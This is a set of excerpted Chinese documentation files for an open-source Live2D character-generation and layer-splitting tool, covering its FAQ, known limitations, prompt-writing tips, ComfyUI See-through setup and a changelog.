1. **使用白色/纯色背景**
   ```bash
   python master_tool.py "anime girl, white background, clean lineart"
   ```

2. **指定清晰轮廓**
   ```bash
   python master_tool.py "anime girl, sharp edges, clear silhouette, isolated"
   ```

3. **避免过多细节**
   ```bash
   # ❌ 过多装饰
   "anime girl with 100 accessories"
   
   # ✅ 适度装饰
   "anime girl with hair ribbon and simple earrings"
   ```

---

## 🐛 故障排除

### 生成失败

**问题**：网络错误
```
Connection error, please try again
```

**解决方案**：
1. 检查网络连接
2. 等待几分钟后重试
3. 使用 `--skip-generate` 用已有图片

**问题**：生成图片模糊
```
Image quality issue
```

**解决方案**：
1. 添加质量提示词
2. 配置付费API
3. 使用更高分辨率提示

### 分层失败

**问题**：图层不准确
```
Layer segmentation issue
```

**解决方案**：
1. 使用更清晰的原图
2. 确保背景干净
3. 尝试不同角度的图片

### 安装问题

**问题**：缺少依赖
```
ModuleNotFoundError: No module named 'xxx'
```

**解决方案**：
```bash
pip install -r requirements.txt
```

---

## 📞 获取帮助

- 📖 查看 [QUICKSTART.md](QUICKSTART.md) - 快速入门

...（省略后续 21 行，原文件共 371 行）...

```

## 常见问题（节选）
**文件**：`docs/FAQ.md`
```
# ❓ Live2D Master Agent - 常见问题

**FAQ - 解答你的疑惑！**

---

## 📚 目录

1. [基础问题](#基础问题)
2. [安装问题](#安装问题)
3. [使用问题](#使用问题)
4. [生成问题](#生成问题)
5. [技术问题](#技术问题)

---

## 🔰 基础问题

### Q1: Live2D Master Agent是什么？

**A**: 
Live2D Master Agent是一款AI辅助Live2D制作工具。它可以帮助你：
- 从文本描述生成角色立绘
- 自动分层生成PSD文件
- 提供Rigging和参数设计指导
- 大幅提升Live2D制作效率

### Q2: 这个工具需要付费吗？

**A**: 
**完全免费！** 
- 使用 Pollinations.ai 服务，无需任何费用
- 无需注册账号
- 无需API密钥（可选配置）

### Q3: 需要安装什么？

**A**:
- Python 3.8 或更高版本
- 网络连接（用于图像生成）
- 可选：火山引擎API密钥（用于更高质量）

### Q4: 生成一张图需要多长时间？

**A**:
- 免费服务：通常30秒-2分钟
- 付费API：通常10-30秒
- 取决于网络和服务器负载

### Q5: 生成的图片可以商用吗？

**A**:
- 请查看 Pollinations.ai 的使用条款
- 建议商用前咨询法律专业人士
- 付费API可能有不同的使用限制

---

## 📦 安装问题

### Q6: pip安装失败怎么办？

**A**:
```bash
# 升级pip
pip install --upgrade pip

# 使用国内镜像
pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple

# 单独安装
pip install Pillow numpy requests psd-tools
```

### Q7: 提示 "python: command not found"

**A**:
1. 确保已安装Python
2. 使用 `python3` 代替 `python`
   ```bash
   python3 master_tool.py "anime girl"
   ```

### Q8: 缺少依赖 "ModuleNotFoundError"

**A**:
```bash
# 重新安装所有依赖
pip install -r requirements.txt

# 或单独安装缺失的包
pip install Pillow
pip install numpy
pip install requests
pip install psd-tools
```

### Q9: Windows系统下无法运行

**A**:
1. 确保Python已添加到PATH
2. 使用命令提示符或PowerShell
3. 或使用Git Bash / WSL

### Q10: Mac/Linux系统权限错误

**A**:
```bash
# 使用pip3
pip3 install -r requirements.txt

# 或使用sudo（不推荐）
sudo pip3 install -r requirements.txt
```

---

## 💻 使用问题

### Q11: 命令行参数怎么使用？

**A**:
```bash
# 查看帮助
python master_tool.py --help

# 常用参数
python master_tool.py "描述"              # 生成图片
python master_tool.py -n 5 "描述"         # 生成5张
python master_tool.py --skip-generate     # 使用已有图片
```

### Q12: 如何生成多个不同的角色？

**A**:
```bash
# 生成5个不同角色
python master_tool.py -n 5 "anime girl"

# 每个都会自动组合不同特征
```

### Q13: 可以使用中文提示词吗？

**A**:
建议使用**英文提示词**，效果会更好。

如果必须使用中文，可以尝试：
```bash
python master_tool.py "可爱的动漫女孩，粉色头发"
```

### Q14: 提示词有什么技巧？

**A**:
**推荐结构**：
```
[角色] + [特征] + [风格] + [质量词]
```

**示例**：
```bash
python master_tool.py "anime girl, long pink hair, blue eyes, school uniform, best quality"
```

### Q15: 如何指定角色的某些特征？

**A**:
直接在提示词中描述：
```bash
python master_tool.py "anime girl, silver hair, red eyes, fox ears, white kimono"
```

---

## 🎨 生成问题

### Q16: 生成的图片模糊怎么办？

**A**:
1. 添加质量词：
   ```bash
   python master_tool.py "anime girl, best quality, ultra detailed"
   ```

2. 配置付费API（更高质量）

3. 使用更高分辨率的原图

### Q17: 图片背景太复杂？

**A**:
1. 在提示词中添加：
   ```bash
   python master_tool.py "anime girl, white background, clean"
   ```

2. 生成后用PS等工具处理背景

3. 使用 `--skip-generate` 配合自己的白底图片

### Q18: 生成的角色"撞衫"？

**A**:
**不可能！**
系统有94个特征组合，每次自动随机选择，确保每个角色都独一无二！

如果想手动控制：
```bash
# 指定特定特征
python master_tool.py "anime girl, red hair, twin tails, maid outfit"
```

### Q19: 分层效果不理想？

**A**:
1. 使用清晰、背景干净的原图
2. 确保图片分辨率足够（建议1024x1024+）
3. 使用 Live2D 友好的提示词：
   ```bash
   python master_tool.py "anime girl, clean lineart, white background, sharp edges"
   ```

### Q20: PSD文件无法打开？

**A**:
1. 确保使用 Live2D Cubism 4.0 或更高版本
2. 检查PSD文件是否完整
3. 尝试重新生成

---

## 🔧 技术问题

### Q21: 如何配置API？

**A**:
```bash
python config_api.py
```

或手动创建 `.env` 文件：
```bash
ARK_API_KEY=your-api-key
```

### Q22: API密钥在哪里获取？

**A**:
1. 访问 https://www.volcengine.com/
2. 注册账号
3. 获取API密钥

### Q23: 网络连接失败？

**A**:
1. 检查网络连接
2. 等待几分钟后重试
3. 使用 `--skip-generate` 模式（使用已有图片）

### Q24: 如何提高生成速度？

**A**:
1. 使用付费API（更快）
2. 选择较小图片尺寸
3. 避开高峰期使用

### Q25: 如何贡献代码/反馈问题？

**A**:
1. 在GitHub提交Issue
2. Fork仓库并提交Pull Request
3. 在社区留言反馈

---

## 💡 技巧与提示

### 获得最佳效果

1. ✅ 使用具体、清晰的描述
2. ✅ 添加质量提升词
3. ✅ 使用白色或简单背景
4. ✅ 指定关键特征（发型、服装等）
5. ✅ 尝试多次生成选择最佳

### 避免常见错误

1. ❌ 不要使用过长、过复杂的描述
2. ❌ 不要同时描述矛盾的特征
3. ❌ 不要使用过于模糊的词汇
4. ❌ 不要使用低分辨率图片进行分层

---

## 📞 更多帮助

- 📖 [QUICKSTART.md](QUICKSTART.md) - 快速入门
- 📖 [USER_GUIDE.md](USER_GUIDE.md) - 完整教程
- 💡 [BEST_PRACTICES.md](BEST_PRACTICES.md) - 最佳实践

...（省略后续 9 行，原文件共 309 行）...

```

## 已知限制
**文件**：`docs/LIMITATIONS.md`
```
# ⚠️ Live2D Master Agent - 已知限制与缺陷

**诚实地列出项目的局限性，帮助你设定合理的期望**

---

## 📋 目录

1. [核心功能限制](#核心功能限制)
2. [技术缺陷](#技术缺陷)
3. [用户体验问题](#用户体验问题)
4. [未来改进方向](#未来改进方向)
5. [已知的Bug](#已知的Bug)

---

## 🔴 核心功能限制

### 1. 图像生成质量限制

#### ❌ 问题描述
- 免费服务（Pollinations.ai）的图像质量不稳定
- 生成的图片有时可能不符合预期
- 某些复杂的描述可能无法正确理解

#### 🔍 具体表现
```bash
# 有时生成的角色可能
- 面部特征不一致
- 手部/手指有问题（AI常见问题）
- 服装细节不准确
- 颜色搭配不完美
```

#### 💡 解决方法
- 多次生成选择最佳
- 使用付费API获得更好质量（如火山引擎Seedream）
- 手动使用PS进行后期修图

---

### 2. 分层精度限制

#### ❌ 问题描述
- 内置分层工具基于简单颜色检测，效果有限
- 复杂服装/配饰可能分错
- 细节纹理分层不准确
- 边缘处理不够精细

#### 🔍 具体表现
```bash
# 内置分层可能遇到
- 头发与背景粘连
- 服装褶皱分层不理想
- 配饰（如项链）位置不对
- 眼镜/帽子分层错误
```

#### 💡 解决方案

##### 🏆 推荐：使用 See-through（SIGGRAPH 2026 级别）

**See-through** 是目前最先进的AI分层工具，已集成到本项目中！

**优势**：
- SIGGRAPH 2026 级别研究
- 使用 LayerDiff 3D + Marigold Depth
- 专为动漫角色设计
- 透明背景 + 各层分离

**使用方法**：
```bash
# 1. 一键安装
python install_comfyui_advanced.py

# 2. 在 ComfyUI 中加载 See-through 工作流
# 3. 输入图片，自动分层为PSD
```

详细文档：[SEE_THROUGH_INTEGRATION.md](SEE_THROUGH_INTEGRATION.md)

##### 🔧 备选：内置分层工具

**v6.0 分层工具**：
```bash
python live2d_layer_v6.py input.png output.psd --mode v6
```
- 使用 K-means 聚类分割
- 包含边缘检测和形态学处理
- 适用于简单背景图片

**v5.0 分层工具**：
```bash
python live2d_layer_pro.py input.png output.psd --mode v5
```
- 简单颜色检测
- 适用于干净背景

**使用建议**：
- 使用高质量、干净背景的原图
- 导入PS后手动微调
- 使用Live2D Cubism Editor进一步调整

---

### 3. 特征随机组合限制

#### ❌ 问题描述
- 虽然有94种特征，但组合可能不合理
- 某些特征组合视觉上不协调
- 没有用户偏好学习

#### 🔍 具体表现
```bash
# 可能出现
- 冬天服装搭配夏天场景
- 复杂配饰与简单服装不协调
- 发色与瞳色不匹配
```

#### 💡 解决方法
- 在提示词中明确指定关键特征
- 多次生成，人工筛选
- 未来可添加用户偏好学习

---

## 🔴 技术缺陷

### 4. 网络依赖问题

#### ❌ 问题描述
- 完全依赖网络连接
- Pollinations.ai服务可能不稳定
- 国内访问可能有网络延迟

#### 🔍 具体表现
```
- 连接超时
- 500错误
- 生成速度慢
- 服务不可用
```

#### 💡 解决方法
- 实现了多服务降级机制（主服务+备用服务）
- 提供了ComfyUI本地部署选项
- 可以使用 --skip-generate 模式跳过网络请求

---

### 5. 付费API配置复杂

#### ❌ 问题描述
- 配置火山引擎API需要技术背景
- API密钥管理有安全风险
- 国内用户获取API有门槛

#### 🔍 具体表现
```
- 普通用户可能不知道如何获取API
- API密钥可能误提交到GitHub
- 配置过程有多个步骤
```

#### 💡 解决方法
- 提供了 config_api.py 工具引导配置
- 创建了 .env.example 模板保护密钥
- 添加了 .gitignore 防止泄露
- 详细文档说明配置流程

---

### 6. 缺少图形界面（GUI）

#### ❌ 问题描述
- 完全命令行操作
- 对非技术用户不友好
- 没有可视化操作选项

#### 🔍 具体表现
```
- 需要打开终端
- 需要输入命令
- 没有点击按钮的界面
```

#### 💡 解决方法
- 未来可开发Web界面
- 未来可开发桌面应用
- 提供详细的命令行教程

---

## 🟡 用户体验问题

### 7. 学习曲线

#### ❌ 问题描述
- 新手需要学习如何写提示词
- 提示词技巧需要经验积累
- 没有预设模板库

#### 💡 解决方法
- 提供了 BEST_PRACTICES.md
- 提供了示例提示词
- 未来可添加模板库

---

### 8. 错误信息不够友好

#### ❌ 问题描述
- 某些错误信息可能技术化
- 新手可能看不懂
- 缺少错误诊断工具

#### 💡 解决方法
- 改善错误提示
- 添加故障排除指南
- 提供诊断脚本

---

### 9. 没有实时预览

#### ❌ 问题描述
- 生成过程中看不到进度
- 只能等生成完成
- 无法中途调整

#### 💡 解决方法
- 可以添加进度条
- 可以添加状态更新
- 可以添加实时预览（如果支持）

---

## 🔵 已知的Bug

### Bug 1: Pollinations.ai服务不稳定

**状态**: ⚠️ 已知问题（外部服务）
**影响**: 有时生成失败
**重现**: 随机发生
**临时解决**: 重试或使用 --skip-generate

---

### Bug 2: PSD文件过大

**状态**: 🟡 低优先级
**影响**: 某些情况下PSD文件可能很大
**重现**: 复杂图片分层后
**临时解决**: 手动压缩或使用小图片

---

### Bug 3: 中文提示词效果不如英文

**状态**: 🟡 低优先级
**影响**: 中文提示词效果可能不理想
**重现**: 使用中文描述
**临时解决**: 建议使用英文

---

## 🚀 未来改进方向

### 优先级A（核心改进）

1. ✅ 添加图形界面（GUI）
   - 简化操作
   - 降低门槛

2. ✅ 预设模板库
   - VTuber模板
   - 游戏角色模板
   - 动画角色模板

3. ✅ 本地图像生成
   - 集成ComfyUI
   - 完全离线可用

### 优先级B（功能增强）

4. ✅ 用户偏好学习
   - 记住用户喜欢的风格
   - 智能推荐特征组合

5. ✅ 批处理增强
   - 批量分层
   - 批量导出

6. ✅ 质量评估工具
   - 自动评估生成质量
   - 评分和建议

### 优先级C（体验优化）

7. ✅ 实时预览
   - 生成进度显示
   - 中间结果预览

8. ✅ 错误诊断
   - 自动诊断常见问题
   - 解决方案推荐

---

## 💡 使用建议

### 管理期望

**这个工具可以：**
✅ 大幅提高工作效率（100倍+）
✅ 快速生成多个候选方案
✅ 使用See-through提供专业级分层
✅ 减少重复性工作

**这个工具不能：**
❌ 完全替代人工设计
❌ 每次都生成完美的图片
❌ 自动完成全部Rigging
❌ 理解所有复杂的描述

---

## 🎯 最佳实践

### 1. 分层工作流

**推荐流程**：
1. 使用 Pollinations.ai 或 Seedream 生成图片
2. **使用 See-through 进行专业级分层**（推荐）
3. 在 PS 中微调
4. 导入 Live2D Cubism Editor

### 2. 分层工具选择

| 工具 | 质量 | 速度 | 难度 | 适用场景 |
|------|------|------|------|----------|
| See-through | ⭐⭐⭐⭐⭐ | 中等 | 中等 | 专业级分层（推荐） |
| v6.0 分层工具 | ⭐⭐⭐ | 快 | 简单 | 简单背景图片 |
| v5.0 分层工具 | ⭐⭐ | 很快 | 简单 | 快速预览 |

### 3. 组合使用
- AI生成 + 人工精修
- 快速原型 + 详细设计
- 批量生成 + 精心挑选

### 4. 持续学习
- 学习提示词技巧
- 了解AI的优缺点
- 积累使用经验

---

## 📞 贡献改进

发现了新的缺陷？有改进建议？

- 🐛 提交 [Issue](https://github.com/mw2wbyys6t-sudo/Live2D/issues)
- 💡 提出 [Discussions](https://github.com/mw2wbyys6t-sudo/Live2D/discussions)
- 🔧 贡献代码（Pull Request）

---

## 📚 相关文档

- 📖 [QUICKSTART.md](QUICKSTART.md) - 快速入门
- 📖 [USER_GUIDE.md](USER_GUIDE.md) - 完整教程
- 📖 [SEE_THROUGH_INTEGRATION.md](SEE_THROUGH_INTEGRATION.md) - See-through集成指南
- ❓ [FAQ.md](FAQ.md) - 常见问题
- 💡 [BEST_PRACTICES.md](BEST_PRACTICES.md) - 最佳实践

---

## 🎉 总结

**没有完美的工具，但可以有完美的工作流！**

结合 See-through（SIGGRAPH 2026）和内置工具，你可以：
- 设定合理的期望
- 使用专业级分层工具
- 取长补短
- 持续改进

**希望这个工具能帮助你！** 💪

---

*最后更新：2026-05-29*
*版本：v6.0（集成See-through）*

```

## 最佳实践（节选）
**文件**：`docs/BEST_PRACTICES.md`
```
# 💡 Live2D Master Agent - 最佳实践指南

**专业技巧，让你的作品更出色！**

---

## 📋 目录

1. [提示词工程](#提示词工程)
2. [角色设计](#角色设计)
3. [分层优化](#分层优化)
4. [工作流程](#工作流程)
5. [效率提升](#效率提升)

---

## 🎯 提示词工程

### 基础结构

**完美提示词公式**：
```
[主体] + [详细特征] + [风格/氛围] + [质量修饰词]
```

### 示例对比

#### ❌ 糟糕的提示词
```bash
python master_tool.py "girl"
```

**结果**：模糊、不准确的生成

#### ✅ 优秀的提示词
```bash
python master_tool.py "beautiful anime girl, long flowing pink hair, bright blue eyes, wearing white dress with blue ribbon, standing pose, soft lighting, pastel colors, clean lineart, white background, best quality, masterpiece"
```

**结果**：清晰、高质量的角色立绘

---

### 关键词类别

#### 主体描述词
| 类别 | 推荐词汇 |
|------|---------|
| 角色类型 | anime girl, chibi character, realistic girl |
| 性别 | female, male, gender-neutral |
| 年龄感 | young, mature, childlike |

#### 特征描述词
| 类别 | 推荐词汇 |
|------|---------|
| 发型 | long hair, short hair, twin tails, ponytail |
| 发色 | pink, silver, blue, red, blonde |
| 眼睛 | large eyes, detailed eyes, heterochromia |
| 服装 | school uniform, casual, kimono, dress |
| 配饰 | hair ribbon, glasses, hat, earrings |

#### 风格词
| 类别 | 推荐词汇 |
|------|---------|
| 整体风格 | anime style, soft style, realistic |
| 光线 | soft lighting, dramatic lighting, natural light |
| 色彩 | pastel colors, vibrant colors, muted tones |
| 背景 | white background, simple background, transparent |

#### 质量词
| 类别 | 推荐词汇 |
|------|---------|
| 质量 | best quality, high quality, ultra detailed |
| 细节 | detailed, intricate, clean |
| Live2D | perfect for Live2D, rigging ready, clean lineart |

---

### 高级技巧

#### 1. 使用权重强调
```bash
# 强调某个特征（通过位置和重复）
python master_tool.py "anime girl, pink pink pink hair, blue eyes"
```

#### 2. 负面提示（虽然工具不直接支持，但可以思考）
- 避免描述你不想要的特征
- 明确你想要的内容

#### 3. 组合多个参考
```bash
# 描述组合
python master_tool.py "anime girl combining elegant grace of Japanese kimono with modern school uniform style"
```

---

## 🎨 角色设计

### 创建一致的角色系列

#### 主角设计
```bash
python master_tool.py "anime hero, blue hair, determined eyes, red cape, heroic pose, golden armor accents, confident expression"
```

#### 同世界观角色
```bash
# 导师
python master_tool.py "anime mentor, long white hair, wise eyes, traditional robes, mystical staff"

# 队友
python master_tool.py "anime companion, short green hair, cheerful smile, light armor, friendly pose"

# 反派
python master_tool.py "anime villain, dark purple hair, cold eyes, black armor, menacing aura"
```

### 创建多样化团队

```bash
# 生成5个角色
python master_tool.py -n 5 "anime mage, magical academy uniform, mystical atmosphere"

# 确保团队多样性
# 角色1: 白发红眼
# 角色2: 蓝发绿眼
# 角色3: 粉发金眼
# 角色4: 黑发紫眼
# 角色5: 绿发蓝眼
```

### 避免"撞衫"技巧

系统自动随机94个特征组合，但你可以：

1. **指定核心特征**
   ```bash
   # 确保每个角色都有独特标识
   python master_tool.py "anime girl with fox features, orange fur, fluffy tail"
   ```

2. **指定服装风格**
   ```bash
   python master_tool.py "anime girl, cyberpunk outfit, neon lights, futuristic"
   ```

3. **指定特殊元素**
   ```bash
   python master_tool.py "anime girl, angel wings, holy aura, divine pose"
   ```

---

## 📐 分层优化

### Live2D友好图片特征

#### ✅ 最佳分层条件

| 特征 | 说明 |
|------|------|
| 背景 | 纯白或简单背景 |
| 轮廓 | 清晰、锐利的边缘 |
| 分辨率 | 1024x1024 或更高 |
| 对比度 | 主体与背景明显区分 |
| 线稿 | 干净、清晰的线条 |

#### ❌ 避免的特征

| 特征 | 问题 |
|------|------|
| 复杂背景 | 难以分离主体 |
| 烟雾/特效 | 图层混乱 |
| 低分辨率 | 分层不准确 |
| 模糊图片 | 边缘不清晰 |
| 过多装饰 | 增加分层难度 |

### 生成Live2D专用图片

```bash
# 强调Clean Lineart
python master_tool.py "anime girl, clean lineart, sharp edges, no shading, minimalist style"

# 强调白色背景
python master_tool.py "anime girl, pure white background, no background elements, isolated character"

# 强调清晰轮廓
python master_tool.py "anime girl, clear silhouette, distinct layers, separated hair strands"
```

### 分层前预处理

如果原图不够理想：

1. **使用PS清理背景**
   - 删除复杂背景
   - 调整为纯白背景

2. **提高对比度**
   - 增强主体与背景分离

3. **锐化边缘**
   - 让分层更准确

4. **调整分辨率**
   - 确保足够清晰

---

## ⚙️ 工作流程

### 推荐的完整工作流

#### 阶段1：概念设计（5分钟）
```bash
# 生成多个草稿
python master_tool.py -n 10 "anime girl character concept"

# 评估并选择最佳
# 考虑：独特性、可分层性、风格一致性
```

#### 阶段2：精细生成（1分钟）
```bash
# 基于选定的概念，添加细节
python master_tool.py "anime girl, detailed concept, best quality, white background, clean lineart"
```

#### 阶段3：分层处理（1分钟）
```bash
# 生成PSD分层
python live2d_layer_pro.py selected_character.png
```

#### 阶段4：导入Live2D Cubism
```bash
# 使用生成的PSD
# 在Cubism中打开
# 进行Rigging
```

### 不同场景工作流

#### VTuber角色创建
1. 生成多个候选角色（-n 10）
2. 选择最具辨识度的设计
3. 优化为Live2D专用
4. 分层并导入Cubism

...（省略后续 139 行，原文件共 389 行）...

```

## 快速入门（节选）
**文件**：`docs/QUICKSTART.md`
```
# 🎯 Live2D Master Agent - 快速入门指南

**3分钟快速上手！**

---

## 🚀 第一步：安装（30秒）

### 方法A：克隆仓库

```bash
git clone https://github.com/mw2wbyys6t-sudo/Live2D.git
cd Live2D
```

### 方法B：直接下载

点击 "Code" → "Download ZIP"，然后解压

---

## 📦 第二步：安装依赖（1分钟）

```bash
pip install -r requirements.txt
```

**所需依赖**：
- Pillow - 图像处理
- numpy - 数值计算
- requests - 网络请求
- psd-tools - PSD文件处理

---

## ✨ 第三步：生成第一个角色（1分钟）

### 最简单命令

```bash
python master_tool.py "cute anime girl"
```

### 生成多样化角色

```bash
# 生成5个不同的角色
python master_tool.py -n 5 "anime girl"
```

### 使用已有图片

```bash
# 如果你有一张图片
python master_tool.py --skip-generate
```

---

## 🎨 第四步：专业分层（1分钟）

### 分层你的角色

```bash
python live2d_layer_pro.py character.png
```

这会生成一个专业的PSD文件，可直接导入Live2D Cubism！

---

## 🎉 成功！

恭喜你！你已经学会了Live2D Master Agent的核心功能！

---

## 📚 下一步

- 📖 [完整使用教程](USER_GUIDE.md) - 学习所有功能
- ❓ [常见问题](FAQ.md) - 解答疑惑
- 💡 [最佳实践](BEST_PRACTICES.md) - 提升效率

---

## 💡 常见问题

### Q: 需要付费吗？
**A**: 不需要！完全免费，使用 Pollinations.ai 服务。

### Q: 需要API密钥吗？
**A**: 不需要！开箱即用。也可以配置火山引擎API获得更高质量。

### Q: 生成需要多久？
**A**: 通常30秒到1分钟。

### Q: 生成的图片可以商用吗？
**A**: 请查看 Pollinations.ai 的使用条款。

---

## 🎯 快速命令参考

| 命令 | 说明 |
|------|------|
| `python master_tool.py "描述"` | 生成角色 |
| `python master_tool.py -n 5 "描述"` | 生成5个角色 |
| `python master_tool.py --skip-generate` | 使用已有图片 |
| `python live2d_layer_pro.py 图片.png` | 专业分层 |
| `python config_api.py` | 配置API |

---

**享受创作的乐趣！** 🎨

*版本: v5.0*

```

## See-through 集成指南（节选）
**文件**：`docs/SEE_THROUGH_INTEGRATION.md`
```
# 🎯 See-through 完整集成指南

**SIGGRAPH 2026级别AI分层工具 - 真正的解决方案**

---

## 📋 目录

1. [什么是See-through？](#什么是see-through)
2. [为什么选择See-through？](#为什么选择see-through)
3. [安装方法](#安装方法)
4. [使用方法](#使用方法)
5. [工作流程](#工作流程)
6. [常见问题](#常见问题)

---

## 🎓 什么是See-through？

### 项目信息
- **论文**: [See-through: Single-image Layer Decomposition for Anime Characters](https://arxiv.org/abs/2602.03749)
- **GitHub**: [shitagaki-lab/see-through](https://github.com/shitagaki-lab/see-through)
- **ComfyUI版本**: [ComfyUI-See-through](https://github.com/jtydhr88/ComfyUI-See-through)
- **学术认证**: **SIGGRAPH 2026** (计算机图形学顶级会议)

### 核心功能

See-through是一个**专为动漫角色设计**的AI分层工具，能够：

```
✅ 将单个动漫角色图像分解为多个可编辑图层
✅ 自动理解语义（头发、眼睛、衣服、配饰）
✅ 处理透明度和遮挡关系
✅ 智能推断隐藏内容
✅ 正确的深度排序
✅ 直接导出PSD文件
```

### 技术原理

See-through使用**两个AI模型**：

#### 1. LayerDiff 3D (SDXL-based)
```
作用: 合成透明、修复后的图层
输出: 语义分组的Alpha通道图层
模型: layerdifforg/seethroughv0.0.2_layerdiff3d
```

#### 2. Marigold Depth
```
作用: 深度估计
功能: 推断相对深度，引导绘制顺序
模型: 24yearsold/seethroughv0.0.1_marigold
```

---

## 🎯 为什么选择See-through？

### 对比分析

| 特性 | 我们的简单工具 | See-through |
|------|--------------|-------------|
| **技术基础** | 颜色检测/K-means | 深度学习（LayerDiff 3D） |
| **学术认证** | 无 | SIGGRAPH 2026 ⭐ |
| **语义理解** | ❌ 无 | ✅ 完整 |
| **透明度处理** | ⚠️ 简单 | ✅ 智能修复 |
| **深度排序** | ⚠️ 硬编码 | ✅ AI推断 |
| **输出质量** | ⚠️ 较差 | ✅ 学术级 |
| **动漫优化** | ❌ 通用 | ✅ 专为动漫 |

### 真实效果对比

**我们的工具（v5.0/v6.0）**:
```bash
# 输入: 动漫角色图片
# 输出: 
- 可能完全错误的图层分配
- 边缘不清晰
- 眼睛、嘴巴识别错误
- 需要大量手动修正
```

**See-through**:
```bash
# 输入: 动漫角色图片
# 输出:
- 正确的语义分层
- 清晰的边缘
- 正确的遮挡关系
- 基本可直接使用
```

---

## 📦 安装方法

### 方法1: ComfyUI完整安装（推荐）⭐⭐⭐⭐⭐

#### 步骤1: 安装ComfyUI

**Windows用户**:
```bash
# 1. 下载ComfyUI便携版
# 访问: https://github.com/comfyanonymous/ComfyUI/releases
# 下载: ComfyUI_windows_portable_nvidia_cu121_or_cpu.7z

# 2. 解压到任意目录（路径不要有中文）

# 3. 运行
cd ComfyUI
run_nvidia_gpu.bat  # 如果有NVIDIA显卡
# 或
run_cpu.bat  # 仅CPU运行（较慢）
```

**Linux/macOS用户**:
```bash
# 1. 克隆仓库
git clone https://github.com/comfyanonymous/ComfyUI.git
cd ComfyUI

# 2. 安装依赖
pip install -r requirements.txt

# 3. 安装PyTorch（根据你的CUDA版本）
pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu121

# 4. 启动
python main.py
```

#### 步骤2: 安装ComfyUI-See-through插件

```bash
# 进入ComfyUI目录
cd ComfyUI/custom_nodes

# 克隆插件
git clone https://github.com/jtydhr88/ComfyUI-See-through.git

# 安装依赖
cd ComfyUI-See-through
pip install -r requirements.txt
```

#### 步骤3: 下载AI模型

模型会自动下载，但如果你想手动下载：

```bash
# 创建模型目录
mkdir -p ComfyUI/models/diffusers

# LayerDiff 3D模型
# 下载: https://huggingface.co/layerdifforg/seethroughv0.0.2_layerdiff3d
# 放入: ComfyUI/models/diffusers/

# Marigold Depth模型
# 下载: https://huggingface.co/24yearsold/seethroughv0.0.1_marigold
# 放入: ComfyUI/models/marigold/
```

#### 步骤4: 加载工作流

1. 打开浏览器访问: http://127.0.0.1:8188
2. 点击"Load"按钮
3. 加载 See-through 工作流JSON文件
4. 或访问: https://www.runcomfy.com/comfyui-workflows/see-through-workflow-in-comfyui-anime-layer-decomposition-psd

---

### 方法2: 官方原版安装（需要Linux）

如果你有Linux系统或愿意配置：

```bash
# 克隆官方仓库
git clone https://github.com/shitagaki-lab/see-through.git
cd see-through

# 安装依赖
pip install -r requirements.txt

# 下载预训练模型
# (参考官方README)

# 运行
python inference.py --input your_image.png
```

---

## 📖 使用方法

### 基本工作流程

#### 1. 准备输入图片


...（省略后续 282 行，原文件共 482 行）...

```

## 更新日志（节选）
**文件**：`CHANGELOG.md`
```
# 更新日志 - 2026-05-20

## v3.0.0 - 用户体验全面升级

### 🆕 新增功能

#### 1. 高质量图像生成
- ✨ **Seedream 5.0 集成**
  - 支持 2048×2048 (2K) 标准分辨率
  - 支持 3072×3072 (3K) 增强分辨率
  - 支持 4096×4096 (4K) 超高分辨率
  - 4个质量级别: draft/standard/high/ultra
  
- 📸 **图像优化特性**
  - 超高细节渲染
  - 锐利线条和清晰轮廓
  - 鲜艳色彩表现
  - 专业级艺术质量
  - 完美支持分层准备

- 🎯 **Live2D 专用提示词模板**
  ```typescript
  // 基础模板
  {character_description}, perfect for Live2D rigging, 
  clean layer separation, isolated character
  
  // 质量增强
  4K, ultra detailed, masterpiece, award-winning
  ```

#### 2. 实时进度反馈
- 📊 **分阶段进度指示器**
  - 读取文件阶段: 20%
  - 解析图层阶段: 50%
  - 质量分析阶段: 80%
  
- 💡 **详细状态文本**
  - 📤 读取文件
  - 🔍 解析图层
  - ✨ 质量分析
  
- 📝 **进度提示信息**
  - "正在处理图层结构，请稍候..."
  - "正在进行质量检测和风险评估..."

#### 3. 增强错误处理
- 🔍 **智能错误诊断**
  - 文件大小超限检测和建议
  - PSD 格式验证
  - 文件损坏检测
  
- 📋 **修复指导卡片**
  - 针对常见错误的详细解决方案
  - 一步步的修复操作指引
  - 可一键复制的建议
  
- 📎 **复制功能**
  - 一键复制完整错误信息
  - 便于用户反馈和技术支持

#### 4. AI 助手优化
- 📖 **长消息处理**
  - 自动截断超过 500 字符的消息
  - "展开全文" 按钮
  - 显示字符数统计
  
- 📨 **消息状态指示**
  - ⏳ 发送中
  - ✓ 已发送
  - ❌ 发送失败
  
- 💬 **快捷提问优化**
  - 智能显示相关问题
  - 根据上下文推荐问题
  - 优化的按钮样式

#### 5. 结果可视化增强
- 📊 **圆形评分仪表盘**
  - SVG 圆形进度显示
  - 渐变色彩
  - 动态过渡动画
  - 颜色编码: 绿/黄/红
  
- 📈 **统计可视化**
  - 问题类型分布
  - 比例条形图
  - 实时更新
  
- 📋 **详情卡片**
  - 展开/收起功能
  - 预期 vs 实际对比
  - 修复建议高亮

#### 6. 移动端体验优化
- 👆 **触控优化**
  - 最小触控目标 48×48px
  - 手势滑动切换步骤
  - 左右滑动方向识别
  
- 📱 **响应式改进**
  - 移动端专用布局
  - 优化的间距和尺寸
  - 触控友好的按钮

- 💡 **使用提示**
  - 移动端显示"左右滑动切换步骤"
  - 优化的触控反馈

### 🔧 技术改进

#### 性能优化
- ✅ React.memo 组件优化
- ✅ useMemo/useCallback 正确使用
- ✅ 动态导入代码分割
- ✅ Tailwind CSS 响应式设计

#### 代码质量
- ✅ TypeScript 严格模式
- ✅ 完整的类型定义
- ✅ 错误边界处理
- ✅ 无障碍支持 (ARIA)

#### 用户体验
- ✅ 清晰的视觉层次
- ✅ 一致的交互反馈
- ✅ 渐进式信息展示
- ✅ 上下文感知的设计

### 📁 文件变更

#### 修改的文件
1. `/workspace/web/components/UploadArea.tsx`
   - 增强进度反馈
   - 添加详细状态文本
   - 优化视觉反馈

2. `/workspace/web/pages/index.tsx`
   - 增强错误处理
   - 添加修复建议
   - 实现手势支持
   - 优化移动端体验

3. `/workspace/web/components/ChatAssistant.tsx`
   - 添加消息展开/收起
   - 消息状态指示
   - 优化长消息显示

4. `/workspace/web/components/QAResult.tsx`
   - 圆形评分仪表盘
   - 统计可视化
   - 问题分布图

5. `/workspace/SKILL.md`
   - 完整功能文档更新
   - 新增最佳实践章节
   - 技术栈说明
   - 变更日志

### 🎯 用户体验提升

#### 改进前
- ❌ 简单进度条
